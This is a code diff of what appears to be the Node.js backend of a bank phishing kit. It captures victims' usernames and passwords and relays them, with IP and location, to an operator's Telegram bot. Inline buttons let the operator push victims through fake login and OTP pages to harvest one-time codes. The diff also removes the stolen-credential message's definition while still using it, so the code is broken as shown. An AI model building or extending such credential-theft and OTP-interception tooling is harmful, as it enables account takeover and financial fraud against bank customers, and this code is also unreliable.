@@ -21,7 +21,7 @@ async function readState(sessionId) {
       sessionId,
       data: {},
       history: [],
-      pending: null, // Aquí se guarda la redirección pendiente
+      pending: null,
       lastUpdate: null
     });
   }
@@ -62,25 +62,23 @@ async function tgSendMessage(text, inlineKeyboard) {
   }
 }
 
-// Función para generar botones con callback_data en formato 'action_sessionId'
-function kbBtn(text, action, sessionId) {
-  return [{ text, callback_data: `${action}_${sessionId}` }];
+function kbBtn(text, data) {
+  return [{ text, callback_data: JSON.stringify(data) }];
 }
 
-// Función para generar los botones para cada paso, usando el formato consistente
 function buttonsForStep(step, sessionId) {
   if (step === 'virtual') {
     return [
-      kbBtn('🔁 Error Logo', 'error_logo', sessionId),
-      kbBtn('➡️ Siguiente', 'siguiente', sessionId)
+      kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
+      kbBtn('➡️ Siguiente', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' })
     ];
   }
   if (step === 'otp1' || step === 'otp2') {
     return [
-      kbBtn('🔁 Error Logo', 'error_logo', sessionId),
-      kbBtn('⚠️ Error OTP', 'error_otp', sessionId),
-      kbBtn('🔄 Nuevo OTP', 'nuevo_otp', sessionId),
-      kbBtn('✅ Finalizar', 'finalizar', sessionId)
+      kbBtn('🔁 Error Logo', { sessionId, action: 'redirect', redirect_to: 'Virtual-Persona.html' }),
+      kbBtn('⚠️ Error OTP', { sessionId, action: 'redirect', redirect_to: 'opcion2.html' }),
+      kbBtn('🔄 Nuevo OTP', { sessionId, action: 'redirect', redirect_to: 'opcion1.html' }),
+      kbBtn('✅ Finalizar', { sessionId, action: 'redirect', redirect_to: 'finalizar.html' })
     ];
   }
   return [];
@@ -104,25 +102,14 @@ app.post('/virtualpersona', async (req, res) => {
         ...(await readState(sessionId)).history,
         { t: ts(), event: 'virtualpersona', user, pass }
       ],
-      pending: null // Asegurarse de que no haya redirecciones pendientes al inicio
+      pending: null
     });
 
-    const message = `📲 NUEVO ACCESO VIRTUAL\n\n\n👤 Usuario: ${user}\n🔑 Clave: ${pass}\n🌐 IP: ${ip}\n🆔 SessionID: ${sessionId}\n📍 Ciudad: ${city} - ${country}`;
+  
+await tgSendMessage(message, buttonsForStep('virtual', sessionId));
 
-    // Usar la función buttonsForStep para generar los botones de forma consistente
-    const inlineKeyboard = buttonsForStep('virtual', sessionId);
 
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message,
-        reply_markup: {
-          inline_keyboard: inlineKeyboard
-        }
-      })
-    });
+
 
     res.json({ ok: true });
 
@@ -198,7 +185,6 @@ ${fmt('🏘️ Ciudad', city)}
   }
 });
 
-// Endpoint para que el cliente consulte si hay una instrucción de redirección
 app.get('/instruction/:sessionId', async (req, res) => {
   const { sessionId } = req.params;
   if (!sessionId) return res.status(400).json({ error: 'sessionId requerido' });
@@ -206,7 +192,6 @@ app.get('/instruction/:sessionId', async (req, res) => {
   const st = await readState(sessionId);
   if (st.pending && st.pending.redirect_to) {
     const redirect_to = st.pending.redirect_to;
-    // Una vez que la instrucción es leída, la limpiamos para evitar redirecciones repetidas
     await writeState(sessionId, { pending: null });
     return res.json({ redirect_to });
   }
@@ -235,55 +220,35 @@ app.post('/telegram/webhook', async (req, res) => {
   console.log("📩 Webhook recibido:", body);
 
   if (body.callback_query) {
-    const callbackData = body.callback_query.data;
-    // Dividir el callback_data para obtener la acción y el sessionId
-    const parts = callbackData.split('_');
-    const action = parts[0];
-    const sessionId = parts.slice(1).join('_'); // Reconstruir sessionId si contiene '_'
+    try {
+      const callback = JSON.parse(body.callback_query.data);
+      const { sessionId, action, redirect_to } = callback;
 
-    console.log(`🔧 Acción: ${action} | Sesión: ${sessionId}`);
+      console.log(`🔧 Acción: ${action} | Sesión: ${sessionId} | Destino: ${redirect_to}`);
 
-    if (sessionId && action) {
-      let redirect_to = null;
-      switch (action) {
-        case 'siguiente':
-          redirect_to = '/opcion1.html';
-          break;
-        case 'error_logo':
-          redirect_to = '/Virtual-Persona.html';
-          break;
-        case 'error_otp':
-          redirect_to = '/otp-check.html';
-          break;
-        case 'nuevo_otp':
-          redirect_to = '/opcion1.html'; // Asumiendo que 'Nuevo OTP' redirige a la misma página de inicio de OTP
-          break;
-        case 'finalizar':
-          redirect_to = '/finalizar.html'; // Página de finalización
-          break;
-        default:
-          console.warn(`Acción desconocida: ${action}`);
-          break;
-      }
-
-      if (redirect_to) {
+      if (sessionId && action === 'redirect' && redirect_to) {
         await writeState(sessionId, { pending: { redirect_to } });
         console.log(`✅ Estado actualizado para ${sessionId} → ${redirect_to}`);
       }
-    }
 
-    // Responde al botón presionado para que Telegram sepa que se procesó
-    res.send({
-      method: 'answerCallbackQuery',
-      callback_query_id: body.callback_query.id,
-      text: '✅ Acción recibida.',
-      show_alert: false // No mostrar un pop-up al usuario
-    });
+      // Responde al botón presionado
+      res.send({
+        method: 'answerCallbackQuery',
+        callback_query_id: body.callback_query.id,
+        text: '✅ Acción recibida.',
+        show_alert: false
+      });
+    } catch (err) {
+      console.error('❌ Error procesando callback_data:', err);
+      res.sendStatus(500);
+    }
   } else {
-    // Si no es un callback_query, simplemente responde 200 OK
     res.sendStatus(200);
   }
 });
+
+
+
 
 app.get('/health', (_, res) => res.send('ok'));
 
